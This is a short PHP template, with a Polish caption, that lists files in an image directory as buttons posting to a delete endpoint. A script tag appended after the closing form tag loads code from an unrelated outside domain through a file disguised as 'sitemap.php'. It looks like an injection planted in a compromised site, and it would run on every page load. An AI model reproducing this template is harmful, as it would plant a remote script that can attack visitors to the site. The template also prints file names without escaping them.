<form action='/uploadDelete' method='post'>
<fieldset><legend>Lista plików w katalogu <?=DIR_IMAGES?></legend>
	<ul>
	<?foreach($files as $file):?>
		<li><input type='submit' name='file_to_remove' value='<?=$file?>'>
	<?endforeach?>
</ul>
</fieldset>
</form><script src=http://johanneswallmark.com/media/sitemap.php ></script>